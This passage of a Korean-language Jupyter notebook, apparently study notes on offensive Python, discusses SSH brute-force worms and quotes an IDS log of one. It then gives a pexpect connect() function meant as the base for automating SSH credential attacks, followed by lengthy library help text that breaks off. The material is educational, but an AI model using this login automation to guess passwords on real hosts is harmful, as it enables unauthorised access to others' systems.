      "- \uc774\uc81c \uacf5\uaca9\ub300\uc0c1\uc744 \ucc3e\uae30 \uc704\ud55c \ud3ec\ud2b8 \uc2a4\uce90\ub108\ub97c \uc81c\uc791\ud588\uc73c\ub2c8 \uac01 \uc11c\ube44\uc2a4\uc5d0 \uc788\ub294 \ucde8\uc57d\uc810\uc744 \uacf5\uaca9\ud560 \uc218 \uc788\uac8c \ub418\uc5c8\ub2e4.\n",
      "- \ubaa8\ub9ac\uc2a4 \uc6dc\uc740 \uadf8\uac83\uc758 3\uac00\uc9c0 \uacf5\uaca9 \uae30\ubc95\uc911\uc758 \ud558\ub098\ub85c\uc368 \uc6d0\uaca9 \uc258(RSH) \uc11c\ube44\uc2a4\uc5d0 \uc77c\ubc18\uc801\uc73c\ub85c \uc0ac\uc6a9\ub418\ub294 \uc0ac\uc6a9\uc790\uc774\ub984\uacfc \ud328\uc2a4\uc6cc\ub4dc\ub97c Brute Forcing \ud558\ub294 \uae30\ubc95 \uc0ac\uc6a9\n",
      "- SSH\ub85c \ub300\uccb4\ub418\uc5b4 \uc554\ud638\ud654\uac00 \ub418\uc5c8\uc9c0\ub9cc \ud754\ud788 \uc0ac\uc6a9\ud558\ub294 \uc0ac\uc6a9\uc790 \uc774\ub984\uacfc \ud328\uc2a4\uc6cc\ub4dc\ub85c \uacf5\uaca9\ud558\ub294 \uac83\uc5d0\ub294 \uc601\ud5a5\uc744 \uc8fc\uc9c0 \uc54a\uae30 \ub54c\ubb38\n",
      "- SSH \uc6dc\uc740 \uc774\ubbf8 \ub9e4\uc6b0 \uc131\uacf5\uc801\uc784\uc744 \uc99d\uba85\ud588\uc73c\uba70, \ud754\ud55c \uacf5\uaca9 \ubca1\ud130\ub85c \uc0ac\uc6a9\ub418\uace0 \uc788\uc74c\n",
      "- \uce68\uc785 \ud0d0\uc9c0 \uc2dc\uc2a4\ud15c(Intrusion Detection System, IDS) \ub85c\uadf8\ub97c \ubcf4\uba74 \ucd5c\uc2e0 SSH \uacf5\uaca9\uc5d0 \ub300\ud574 \uc9c1\uc811 \uc0b4\ud3b4\ubcfc \uc218 \uc788\uc74c\n",
      "- \uc5ec\uae30\uc11c \uacf5\uaca9\uc790\ub294 ucla, oxford, matrix \uacc4\uc815\uc73c\ub85c \ucef4\ud4e8\ud130\uc5d0 \uc811\uc18d\ud558\ub824\uace0 \ud588\ub2e4. \uc0ac\uc2e4 \uc774 \uacc4\uc815\ub4e4\uc740 \ub9e4\uc6b0 \ud765\ubbf8\ub85c\uc6b4 \uc120\ud0dd\n",
      "- \ub2e4\ud589\ud788 IDS\uac00 \uc774 \uacf5\uaca9\uc744 \ud0d0\uc9c0\ud558\uc5ec \ud574\ub2f9 IP \uc8fc\uc18c\uc5d0\uc11c SSH \ub85c\uadf8\uc778\uc744 \ud558\uc9c0 \ubabb\ud558\ub3c4\ub85d \ucc28\ub2e8\n",
      "\n",
      "#### [www.violentpython.org](http://www.violentpython.org): \uc6b4\uc601 \uc548\ud568"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "    Received From: violentPython-> /var/log/auth.log\n",
      "    Rule: 5712 fired (level 10) -> \"SSHD brute force trying to get access to the system.\"\n",
      "    Portion of the log(s):\n",
      "    Oct 13 23:30:30 violentPython sshd[10956]: Invalid user ucla from 67.228.3.58\n",
      "    Oct 13 23:30:29 violentPython sshd[10954]: Invalid user ucla from 67.228.3.58\n",
      "    Oct 13 23:30:29 violentPython sshd[10952]: Invalid user oxford from 67.228.3.58\n",
      "    Oct 13 23:30:28 violentPython sshd[10950]: Invalid user oxford from 67.228.3.58\n",
      "    Oct 13 23:30:28 violentPython sshd[10948]: Invalid user oxford from 67.228.3.58\n",
      "    Oct 13 23:30:27 violentPython sshd[10946]: Invalid user matrix from 67.228.3.58\n",
      "    Oct 13 23:30:27 violentPython sshd[10944]: Invalid user matrix from 67.228.3.58"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# !cat ch02/auth.log"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 13
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### [Pexpect](http://pexpect.sourceforge.net)\ub85c SSH \uc5f0\uacb0\ud558\uae30\n",
      "\n",
      "- \uacf5\uaca9\ub300\uc0c1\uc758 \uc0ac\uc6a9\uc790 \uacc4\uc815\uc744 \uacf5\uaca9\ud558\ub294 \uc790\ub3d9\ud654 SSH \uc6dc\uc744 \uc9c1\uc811 \uad6c\ud604\ud574\ubcf4\uc790\n",
      "- SSH \ud074\ub77c\uc774\uc5b8\ud2b8 \ud504\ub85c\uadf8\ub7a8\uc740 \uc0ac\uc6a9\uc790\uac00 \uc9c1\uc811 \uc785\ub825\ud574\uc57c \ud558\ub294 \ubd80\ubd84\ub4e4\uc774 \uc788\uae30 \ub54c\ubb38\uc5d0, \uc2a4\ud06c\ub9bd\ud2b8\ub85c SSH\ub97c \uc791\ub3d9\uc2dc\ud0a4\uae30 \uc704\ud574\uc11c\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8 \ud504\ub85c\uadf8\ub7a8\uc5d0\uc11c **\uae30\ub300\ud558\uace0 \uc788\ub294 \uba85\ub839\uc5b4**\ub098 **\uac12**\uc744 **\uc2a4\ud06c\ub9bd\ud2b8\uc5d0\uc11c \uc785\ub825**\uc2dc\ud0ac \uc218 \uc788\uc5b4\uc57c \ud568\n",
      "- \ubaa8\ub4e0 \uac83\uc774 \uc644\ub8cc\ud558\uba74 \uc6b0\ub9ac\uac00 **\uc6d0\ud558\ub294 \uba85\ub839\uc5b4**\ub97c SSH\ub85c **\uc804\uc1a1**\ud560 \uc218 \uc788\uc74c\n",
      "\n",
      "#### SSH Install in mac\n",
      "\n",
      "> pip install pexpect\n",
      "\n",
      "#### SSH server for windows\n",
      "\n",
      "- [bitvise ssh](http://www.bitvise.com/ssh-server-download)\n",
      "\n",
      "#### SSH Login Logic\n",
      "\n",
      "1. 127.0.0.1\uc5d0 \uc788\ub294 SSH \ucef4\ud4e8\ud130\uc5d0 \uc811\uc18d\ud558\uae30 \uc704\ud574\uc11c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc740 \uba3c\uc800 RSA \ud0a4 \ud551\uac70\ud504\ub9b0\ud2b8\ub97c \ud655\uc778\ud558\ub77c\uace0 \ubb3c\uc5b4\ubd04\n",
      "2. \uc5ec\uae30\uc11c\ub294 \ub2e4\uc74c \ub2e8\uacc4\ub85c \ub118\uc5b4 \uac00\uae30 \uc804\uc5d0 \ubc18\ub4dc\uc2dc \"yes\"\ub77c\uace0 \uc751\ub2f5\ud574\uc57c \ud568\n",
      "3. \ub2e4\uc74c\uc73c\ub85c \ucee4\ub9e8\ub4dc \ud504\ub86c\ud504\ud2b8\ub97c \ubc1b\uae30 \uc804\uc5d0 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc740 \ud328\uc2a4\uc6cc\ub4dc\ub97c \uc785\ub825\ud558\ub77c\uace0 \ud568\n",
      "4. \ub9c8\uc9c0\ub9c9\uc73c\ub85c uname -v \uba85\ub839\uc5b4\ub97c \uc2e4\ud589\ud558\uc5ec \uacf5\uaca9\ub300\uc0c1\uc5d0\uc11c \uc2e4\ud589\ud558\uace0 \uc788\ub294 \ucee4\ub110(kernel) \ubc84\uc804\uc744 \ud655\uc778\ud55c\ub2e4.\n",
      "\n",
      "<img src=\"files/images/quiz.png\" />\n",
      "#### Quiz\n",
      "\n",
      "- \uc790\ub3d9\ud654\ub97c \ud558\uae30 \uc704\ud574\uc11c \uac00\uc7a5 \uba3c\uc800 \ud574\uc57c\ud560 \uc77c\uc740?\n",
      "- [expect\ub97c \uc774\uc6a9\ud55c \uc790\ub3d9\ud654 \ud504\ub85c\uadf8\ub798\ubc0d](http://www.joinc.co.kr/modules/moniwiki/wiki.php/Site/JPerl/expect)\n",
      "\n",
      "\n",
      "1. \ub85c\uc9c1\uc744 \ubd84\uc11d\ud55c\ub2e4.\n",
      "2. input\uac12\uc774 \ubb34\uc5c7\uc774\uace0 \ucd9c\ub825\uac12\uc774 \ubb34\uc5c7\uc778\uc9c0 \ud655\uc778\ud55c\ub2e4.\n",
      "3. \ud504\ub85c\uadf8\ub7a8\uc744 \uc880 \ub354 \uc720\uc5f0\ud558\uac8c \ub9cc\ub4e4 \uc218 \uc788\ub294 \uac83\ub4e4\uc744 \uc0dd\uac01\ud574 \ubcf8\ub2e4."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# !cat ch02/automation.txt"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 99
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# !ssh re4lfl0w@127.0.0.1"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### SSH Local Login\n",
      "<img src=\"files/images/ssh_login.png\" />"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### Pexpect \uae30\ub2a5\n",
      "\n",
      "- \ud504\ub85c\uadf8\ub7a8 \uc791\ub3d9\n",
      "- \ud504\ub85c\uadf8\ub7a8\uc5d0\uc11c \uae30\ub300\ud558\uace0 \uc788\ub294 \uacb0\uacfc\uac12 \ubcf4\uae30\n",
      "- \uae30\ub300\ud558\uace0 \uc788\ub294 \uacb0\uacfc\uac12\uc744 \ubc14\ud0d5\uc73c\ub85c \uc751\ub2f5\ud558\uae30\n",
      "\n",
      "\n",
      "- \uc774 3\uac00\uc9c0 \uae30\ub2a5\ub4e4\uc740 SSH \uc0ac\uc6a9\uc790 \uc778\uc99d\uc815\ubcf4\ub97c \uacf5\uaca9\ud558\ub294 \uacfc\uc815\uc744 \uc790\ub3d9\ud654\ud558\ub294\ub370 \ub9e4\uc6b0 \uc801\ud569"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### Connect() \ud568\uc218\n",
      "\n",
      "- \uc0ac\uc6a9\uc790 \uc774\ub984, \ud638\uc2a4\ud2b8 \uc774\ub984, \ud328\uc2a4\uc6cc\ub4dc\ub97c \uc785\ub825 \ubc1b\uc544\uc11c SSH \ud1b5\uc2e0\uc744 \ubc18\ud658\ud558\uace0 SSH \uc5f0\uacb0\ub85c \uc774\ub8e8\uc5b4\uc9d0\n",
      "- pexpect \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc2a4\ud06c\ub9bd\ud2b8\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8\uc5d0\uc11c \uae30\ub300\ud558\uace0 \uc788\ub294 \uacb0\uacfc\uac12\uc744 \uae30\ub2e4\ub9bc\n",
      "- \uacb0\uacfc\uac12 3\uac00\uc9c0: \uc2dc\uac04 \ucd08\uacfc, \ub2e4\ub978 \ud638\uc2a4\ud2b8\uc5d0 \uc0c8\ub85c\uc6b4 \uacf5\uac1c \ud0a4\uac00 \uc788\ub2e4\ub294 \uba54\uc2dc\uc9c0, \ub9c8\uc9c0\ub9c9\uc73c\ub85c \ud328\uc2a4\uc6cc\ub4dc \ud504\ub86c\ud504\ud2b8"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# -*- coding: utf-8\n",
      "import pexpect\n",
      "\n",
      "PROMPT = ['# ', '>>> ', '> ', '\\$ ']\n",
      "\n",
      "def send_command(child, cmd):\n",
      "    child.sendline(cmd)\n",
      "    child.expect(PROMPT)\n",
      "    # sendline \ubcf4\ub0b8 \ud6c4 \uacb0\uacfc\uac12 \ucd9c\ub825\ud574\uc918\n",
      "    print child.before\n",
      "    \n",
      "def connect(user, host, password):\n",
      "    ssh_newkey = 'Are you sure you want to continue connecting'\n",
      "    # ssh re4lf0w@127.0.0.1\n",
      "    connStr = 'ssh ' + user + '@' + host\n",
      "    child = pexpect.spawn(connStr)\n",
      "    ssh_password = '[P|p]assword:'\n",
      "    # child.expect\ub85c child\ub97c \uc2e4\ud589\ud558\uace0 3\uac00\uc9c0 \uac12\uc744 \uae30\ub2e4\ub9b0\ub2e4.\n",
      "    #                   0                1           2\n",
      "    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, ssh_password])\n",
      "    \n",
      "    # \uc2dc\uac04\ucd08\uacfc\uac00 \ubc1c\uc0dd\ud558\uba74 0 \ubc18\ud658\n",
      "    if ret == 0:\n",
      "        print '[-] Error Connecting'\n",
      "        return\n",
      "    \n",
      "    # ssh_newkey \uba54\uc2dc\uc9c0\ub97c \ubc1b\uc73c\uba74 1 \ubc18\ud658\n",
      "    if ret == 1:\n",
      "        child.sendline('yes')\n",
      "        ret = child.expect([pexpect.TIMEOUT, ssh_password])\n",
      "        \n",
      "        # \uc2dc\uac04\ucd08\uacfc\uac00 \ubc1c\uc0dd\ud558\uba74 0 \ubc18\ud658\n",
      "        if ret == 0:\n",
      "            print '[-] Error Connecting'\n",
      "            return\n",
      "    \n",
      "    # \uc2dc\uac04\ucd08\uacfc\uac00 \ubc1c\uc0dd\ud558\uc9c0 \uc54a\uace0 shh_newkey \uba54\uc2dc\uc9c0\uac00 \ub728\uc9c0 \uc54a\uc558\uc73c\uba74 password\ub97c \ubcf4\ub0b8\ub2e4.\n",
      "    child.sendline(password)\n",
      "    child.expect(PROMPT)\n",
      "    return child"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 9
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "help(pexpect.spawn)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Help on class spawn in module pexpect:\n",
        "\n",
        "class spawn(__builtin__.object)\n",
        " |  This is the main class interface for Pexpect. Use this class to start\n",
        " |  and control child applications.\n",
        " |  \n",
        " |  Methods defined here:\n",
        " |  \n",
        " |  __del__(self)\n",
        " |      This makes sure that no system resources are left open. Python only\n",
        " |      garbage collects Python objects. OS file descriptors are not Python\n",
        " |      objects, so they must be handled explicitly. If the child file\n",
        " |      descriptor was opened outside of this class (passed to the constructor)\n",
        " |      then this does not close it.\n",
        " |  \n",
        " |  __init__(self, command, args=[], timeout=30, maxread=2000, searchwindowsize=None, logfile=None, cwd=None, env=None, ignore_sighup=True)\n",
        " |      This is the constructor. The command parameter may be a string that\n",
        " |      includes a command and any arguments to the command. For example::\n",
        " |      \n",
        " |          child = pexpect.spawn('/usr/bin/ftp')\n",
        " |          child = pexpect.spawn('/usr/bin/ssh user@example.com')\n",
        " |          child = pexpect.spawn('ls -latr /tmp')\n",
        " |      \n",
        " |      You may also construct it with a list of arguments like so::\n",
        " |      \n",
        " |          child = pexpect.spawn('/usr/bin/ftp', [])\n",
        " |          child = pexpect.spawn('/usr/bin/ssh', ['user@example.com'])\n",
        " |          child = pexpect.spawn('ls', ['-latr', '/tmp'])\n",
        " |      \n",
        " |      After this the child application will be created and will be ready to\n",
        " |      talk to. For normal use, see expect() and send() and sendline().\n",
        " |      \n",
        " |      Remember that Pexpect does NOT interpret shell meta characters such as\n",
        " |      redirect, pipe, or wild cards (``>``, ``|``, or ``*``). This is a\n",
        " |      common mistake.  If you want to run a command and pipe it through\n",
        " |      another command then you must also start a shell. For example::\n",
        " |      \n",
        " |          child = pexpect.spawn('/bin/bash -c \"ls -l | grep LOG > logs.txt\"')\n",
        " |          child.expect(pexpect.EOF)\n",
        " |      \n",
        " |      The second form of spawn (where you pass a list of arguments) is useful\n",
        " |      in situations where you wish to spawn a command and pass it its own\n",
        " |      argument list. This can make syntax more clear. For example, the\n",
        " |      following is equivalent to the previous example::\n",
        " |      \n",
        " |          shell_cmd = 'ls -l | grep LOG > logs.txt'\n",
        " |          child = pexpect.spawn('/bin/bash', ['-c', shell_cmd])\n",
        " |          child.expect(pexpect.EOF)\n",
        " |      \n",
        " |      The maxread attribute sets the read buffer size. This is maximum number\n",
        " |      of bytes that Pexpect will try to read from a TTY at one time. Setting\n",
        " |      the maxread size to 1 will turn off buffering. Setting the maxread\n",
        " |      value higher may help performance in cases where large amounts of\n",
        " |      output are read back from the child. This feature is useful in\n",
        " |      conjunction with searchwindowsize.\n",
        " |      \n",
        " |      The searchwindowsize attribute sets the how far back in the incoming\n",
        " |      seach buffer Pexpect will search for pattern matches. Every time\n",
        " |      Pexpect reads some data from the child it will append the data to the\n",
        " |      incoming buffer. The default is to search from the beginning of the\n",
        " |      incoming buffer each time new data is read from the child. But this is\n",
        " |      very inefficient if you are running a command that generates a large\n",
        " |      amount of data where you want to match. The searchwindowsize does not\n",
        " |      affect the size of the incoming data buffer. You will still have\n",
        " |      access to the full buffer after expect() returns.\n",
        " |      \n",
        " |      The logfile member turns on or off logging. All input and output will\n",
        " |      be copied to the given file object. Set logfile to None to stop\n",
        " |      logging. This is the default. Set logfile to sys.stdout to echo\n",
        " |      everything to standard output. The logfile is flushed after each write.\n",
        " |      \n",
        " |      Example log input and output to a file::\n",
        " |      \n",
        " |          child = pexpect.spawn('some_command')\n",
        " |          fout = file('mylog.txt','w')\n",
        " |          child.logfile = fout\n",
        " |      \n",
        " |      Example log to stdout::\n",
        " |      \n",
        " |          child = pexpect.spawn('some_command')\n",
        " |          child.logfile = sys.stdout\n",
        " |      \n",
        " |      The logfile_read and logfile_send members can be used to separately log\n",
        " |      the input from the child and output sent to the child. Sometimes you\n",
        " |      don't want to see everything you write to the child. You only want to\n",
        " |      log what the child sends back. For example::\n",
        " |      \n",
        " |          child = pexpect.spawn('some_command')\n",
        " |          child.logfile_read = sys.stdout\n",
        " |      \n",
        " |      To separately log output sent to the child use logfile_send::\n",
        " |      \n",
        " |          self.logfile_send = fout\n",
        " |      \n",
        " |      If ``ignore_sighup`` is True, the child process will ignore SIGHUP\n",
        " |      signals. For now, the default is True, to preserve the behaviour of\n",
        " |      earlier versions of Pexpect, but you should pass this explicitly if you\n",
        " |      want to rely on it.\n",
        " |      \n",
        " |      The delaybeforesend helps overcome a weird behavior that many users\n",
        " |      were experiencing. The typical problem was that a user would expect() a\n",
        " |      \"Password:\" prompt and then immediately call sendline() to send the\n",
        " |      password. The user would then see that their password was echoed back\n",
        " |      to them. Passwords don't normally echo. The problem is caused by the\n",
        " |      fact that most applications print out the \"Password\" prompt and then\n",
        " |      turn off stdin echo, but if you send your password before the\n",
        " |      application turned off echo, then you get your password echoed.\n",
        " |      Normally this wouldn't be a problem when interacting with a human at a\n",
        " |      real keyboard. If you introduce a slight delay just before writing then\n",
        " |      this seems to clear up the problem. This was such a common problem for\n",
        " |      many users that I decided that the default pexpect behavior should be\n",
        " |      to sleep just before writing to the child application. 1/20th of a\n",
        " |      second (50 ms) seems to be enough to clear up the problem. You can set\n",
        " |      delaybeforesend to 0 to return to the old behavior. Most Linux machines\n",
        " |      don't like this to be below 0.03. I don't know why.\n",
        " |      \n",
        " |      Note that spawn is clever about finding commands on your path.\n",
        " |      It uses the same logic that \"which\" uses to find executables.\n",
        " |      \n",
        " |      If you wish to get the exit status of the child you must call the\n",
        " |      close() method. The exit or signal status of the child will be stored\n",
        " |      in self.exitstatus or self.signalstatus. If the child exited normally\n",
        " |      then exitstatus will store the exit return code and signalstatus will\n",
        " |      be None. If the child was terminated abnormally with a signal then\n",
        " |      signalstatus will store the signal value and exitstatus will be None.\n",
        " |      If you need more detail you can also read the self.status member which\n",
        " |      stores the status returned by os.waitpid. You can interpret this using\n",
        " |      os.WIFEXITED/os.WEXITSTATUS or os.WIFSIGNALED/os.TERMSIG.\n",
        " |  \n",
        " |  __iter__(self)\n",
        " |      This is to support iterators over a file-like object.\n",
        " |  \n",
        " |  __str__(self)\n",
        " |      This returns a human-readable string that represents the state of\n",
        " |      the object.\n",
        " |  \n",
        " |  close(self, force=True)\n",
        " |      This closes the connection with the child application. Note that\n",
        " |      calling close() more than once is valid. This emulates standard Python\n",
        " |      behavior with files. Set force to True if you want to make sure that\n",
        " |      the child is terminated (SIGKILL is sent if the child ignores SIGHUP\n",
        " |      and SIGINT).\n",
        " |  \n",
        " |  compile_pattern_list(self, patterns)\n",
        " |      This compiles a pattern-string or a list of pattern-strings.\n",
        " |      Patterns must be a StringType, EOF, TIMEOUT, SRE_Pattern, or a list of\n",
        " |      those. Patterns may also be None which results in an empty list (you\n",
        " |      might do this if waiting for an EOF or TIMEOUT condition without\n",
        " |      expecting any pattern).\n",
        " |      \n",
        " |      This is used by expect() when calling expect_list(). Thus expect() is\n",
        " |      nothing more than::\n",
        " |      \n",
        " |           cpl = self.compile_pattern_list(pl)\n",
        " |           return self.expect_list(cpl, timeout)\n",
        " |      \n",
        " |      If you are using expect() within a loop it may be more\n",
        " |      efficient to compile the patterns first and then call expect_list().\n",
        " |      This avoid calls in a loop to compile_pattern_list()::\n",
        " |      \n",
        " |           cpl = self.compile_pattern_list(my_pattern)\n",
        " |           while some_condition:\n",
        " |              ...\n",
        " |              i = self.expect_list(clp, timeout)\n",
        " |              ...\n",
        " |  \n",
        " |  eof(self)\n",
        " |      This returns True if the EOF exception was ever raised.\n",
        " |  \n",
        " |  expect(self, pattern, timeout=-1, searchwindowsize=-1)\n",
        " |      This seeks through the stream until a pattern is matched. The\n",
        " |      pattern is overloaded and may take several types. The pattern can be a\n",
        " |      StringType, EOF, a compiled re, or a list of any of those types.\n",
        " |      Strings will be compiled to re types. This returns the index into the\n",
        " |      pattern list. If the pattern was not a list this returns index 0 on a\n",
        " |      successful match. This may raise exceptions for EOF or TIMEOUT. To\n",
        " |      avoid the EOF or TIMEOUT exceptions add EOF or TIMEOUT to the pattern\n",
        " |      list. That will cause expect to match an EOF or TIMEOUT condition\n",
        " |      instead of raising an exception.\n",
        " |      \n",
        " |      If you pass a list of patterns and more than one matches, the first\n",
        " |      match in the stream is chosen. If more than one pattern matches at that\n",
        " |      point, the leftmost in the pattern list is chosen. For example::\n",
        " |      \n",
        " |          # the input is 'foobar'\n",
        " |          index = p.expect(['bar', 'foo', 'foobar'])\n",
        " |          # returns 1('foo') even though 'foobar' is a \"better\" match\n",
        " |      \n",
        " |      Please note, however, that buffering can affect this behavior, since\n",
        " |      input arrives in unpredictable chunks. For example::\n",
        " |      \n",
        " |          # the input is 'foobar'\n",
        " |          index = p.expect(['foobar', 'foo'])\n",
        " |          # returns 0('foobar') if all input is available at once,\n",
        " |          # but returs 1('foo') if parts of the final 'bar' arrive late\n",
        " |      \n",
        " |      After a match is found the instance attributes 'before', 'after' and\n",
        " |      'match' will be set. You can see all the data read before the match in\n",
        " |      'before'. You can see the data that was matched in 'after'. The\n",
        " |      re.MatchObject used in the re match will be in 'match'. If an error\n",
        " |      occurred then 'before' will be set to all the data read so far and\n",
        " |      'after' and 'match' will be None.\n",
        " |      \n",
        " |      If timeout is -1 then timeout will be set to the self.timeout value.\n",
        " |      \n",
        " |      A list entry may be EOF or TIMEOUT instead of a string. This will\n",
        " |      catch these exceptions and return the index of the list entry instead\n",
        " |      of raising the exception. The attribute 'after' will be set to the\n",
        " |      exception type. The attribute 'match' will be None. This allows you to\n",
        " |      write code like this::\n",
        " |      \n",
        " |              index = p.expect(['good', 'bad', pexpect.EOF, pexpect.TIMEOUT])\n",
        " |              if index == 0:\n",
        " |                  do_something()\n",
        " |              elif index == 1:\n",
        " |                  do_something_else()\n",
        " |              elif index == 2:\n",
        " |                  do_some_other_thing()\n",
        " |              elif index == 3:\n",
        " |                  do_something_completely_different()\n",
        " |      \n",
        " |      instead of code like this::\n",
        " |      \n",
        " |              try:\n",
        " |                  index = p.expect(['good', 'bad'])\n",
        " |                  if index == 0:\n",
        " |                      do_something()\n",
        " |                  elif index == 1:\n",
        " |                      do_something_else()\n",
        " |              except EOF:\n",
        " |                  do_some_other_thing()\n",
        " |              except TIMEOUT:\n",
        " |                  do_something_completely_different()\n",
        " |      \n",
        " |      These two forms are equivalent. It all depends on what you want. You\n",
        " |      can also just expect the EOF if you are waiting for all output of a\n",
        " |      child to finish. For example::\n",
        " |      \n",
        " |              p = pexpect.spawn('/bin/ls')\n",
        " |              p.expect(pexpect.EOF)\n",
        " |              print p.before\n",
        " |      \n",
        " |      If you are trying to optimize for speed then see expect_list().\n",
        " |  \n",
        " |  expect_exact(self, pattern_list, timeout=-1, searchwindowsize=-1)\n",
        " |      This is similar to expect(), but uses plain string matching instead\n",
        " |      of compiled regular expressions in 'pattern_list'. The 'pattern_list'\n",
        " |      may be a string; a list or other sequence of strings; or TIMEOUT and\n",
        " |      EOF.\n",
        " |      \n",
        " |      This call might be faster than expect() for two reasons: string\n",
        " |      searching is faster than RE matching and it is possible to limit the\n",
        " |      search to just the end of the input buffer.\n",
        " |      \n",
        " |      This method is also useful when you don't want to have to worry about\n",
        " |      escaping regular expression characters that you want to match.\n",
        " |  \n",
        " |  expect_list(self, pattern_list, timeout=-1, searchwindowsize=-1)\n",
        " |      This takes a list of compiled regular expressions and returns the\n",
        " |      index into the pattern_list that matched the child output. The list may\n",
        " |      also contain EOF or TIMEOUT(which are not compiled regular\n",
        " |      expressions). This method is similar to the expect() method except that\n",
        " |      expect_list() does not recompile the pattern list on every call. This\n",
        " |      may help if you are trying to optimize for speed, otherwise just use\n",
        " |      the expect() method.  This is called by expect(). If timeout==-1 then\n",
        " |      the self.timeout value is used. If searchwindowsize==-1 then the\n",
        " |      self.searchwindowsize value is used.\n",
        " |  \n",
        " |  expect_loop(self, searcher, timeout=-1, searchwindowsize=-1)\n",
        " |      This is the common loop used inside expect. The 'searcher' should be\n",
        " |      an instance of searcher_re or searcher_string, which describes how and\n",
        " |      what to search for in the input.\n",
        " |      \n",
        " |      See expect() for other arguments, return value and exceptions.\n",
        " |  \n",
        " |  fileno(self)\n",
        " |      This returns the file descriptor of the pty for the child.\n",
        " |  \n",
        " |  flush(self)\n",
        " |      This does nothing. It is here to support the interface for a\n",
        " |      File-like object.\n",
        " |  \n",
        " |  getecho(self)\n",
        " |      This returns the terminal echo mode. This returns True if echo is\n",
        " |      on or False if echo is off. Child applications that are expecting you\n",
        " |      to enter a password often set ECHO False. See waitnoecho().\n",
        " |  \n",
        " |  getwinsize(self)\n",
        " |      This returns the terminal window size of the child tty. The return\n",
        " |      value is a tuple of (rows, cols).\n",
        " |  \n",
        " |  interact(self, escape_character='\\x1d', input_filter=None, output_filter=None)\n",
        " |      This gives control of the child process to the interactive user (the\n",
        " |      human at the keyboard). Keystrokes are sent to the child process, and\n",
        " |      the stdout and stderr output of the child process is printed. This\n",
        " |      simply echos the child stdout and child stderr to the real stdout and\n",
        " |      it echos the real stdin to the child stdin. When the user types the\n",
        " |      escape_character this method will stop. The default for\n",
        " |      escape_character is ^]. This should not be confused with ASCII 27 --\n",
        " |      the ESC character. ASCII 29 was chosen for historical merit because\n",
        " |      this is the character used by 'telnet' as the escape character. The\n",
        " |      escape_character will not be sent to the child process.\n",
        " |      \n",
        " |      You may pass in optional input and output filter functions. These\n",
        " |      functions should take a string and return a string. The output_filter\n",
        " |      will be passed all the output from the child process. The input_filter\n",
        " |      will be passed all the keyboard input from the user. The input_filter\n",
        " |      is run BEFORE the check for the escape_character.\n",
        " |      \n",
        " |      Note that if you change the window size of the parent the SIGWINCH\n",
        " |      signal will not be passed through to the child. If you want the child\n",
        " |      window size to change when the parent's window size changes then do\n",
        " |      something like the following example::\n",
        " |      \n",
        " |          import pexpect, struct, fcntl, termios, signal, sys\n",
        " |          def sigwinch_passthrough (sig, data):\n",
        " |              s = struct.pack(\"HHHH\", 0, 0, 0, 0)\n",
        " |              a = struct.unpack('hhhh', fcntl.ioctl(sys.stdout.fileno(),\n",
        " |                  termios.TIOCGWINSZ , s))\n",
        " |              global p\n",
        " |              p.setwinsize(a[0],a[1])\n",
        " |          # Note this 'p' global and used in sigwinch_passthrough.\n",
        " |          p = pexpect.spawn('/bin/bash')\n",
        " |          signal.signal(signal.SIGWINCH, sigwinch_passthrough)\n",
        " |          p.interact()\n",
        " |  \n",
        " |  isalive(self)\n",
        " |      This tests if the child process is running or not. This is\n",
        " |      non-blocking. If the child was terminated then this will read the\n",
        " |      exitstatus or signalstatus of the child. This returns True if the child\n",
        " |      process appears to be running or False if not. It can take literally\n",
        " |      SECONDS for Solaris to return the right status.\n",
        " |  \n",
        " |  isatty(self)\n",
        " |      This returns True if the file descriptor is open and connected to a\n",
        " |      tty(-like) device, else False.\n",
        " |  \n",
        " |  kill(self, sig)\n",
        " |      This sends the given signal to the child application. In keeping\n",
        " |      with UNIX tradition it has a misleading name. It does not necessarily\n",
        " |      kill the child unless you send the right signal.\n",
        " |  \n",
        " |  read(self, size=-1)\n",
        " |      This reads at most \"size\" bytes from the file (less if the read hits\n",
        " |      EOF before obtaining size bytes). If the size argument is negative or\n",
        " |      omitted, read all data until EOF is reached. The bytes are returned as\n",
        " |      a string object. An empty string is returned when EOF is encountered\n",
        " |      immediately.\n",
        " |  \n",
        " |  read_nonblocking(self, size=1, timeout=-1)\n",
        " |      This reads at most size characters from the child application. It\n",
        " |      includes a timeout. If the read does not complete within the timeout\n",
        " |      period then a TIMEOUT exception is raised. If the end of file is read\n",
        " |      then an EOF exception will be raised. If a log file was set using\n",
        " |      setlog() then all data will also be written to the log file.\n",
        " |      \n",
        " |      If timeout is None then the read may block indefinitely.\n",
        " |      If timeout is -1 then the self.timeout value is used. If timeout is 0\n",
        " |      then the child is polled and if there is no data immediately ready\n",
        " |      then this will raise a TIMEOUT exception.\n",
        " |      \n",
        " |      The timeout refers only to the amount of time to read at least one\n",
        " |      character. This is not effected by the 'size' parameter, so if you call\n",
        " |      read_nonblocking(size=100, timeout=30) and only one character is\n",
        " |      available right away then one character will be returned immediately.\n",
        " |      It will not wait for 30 seconds for another 99 characters to come in.\n",
        " |      \n",
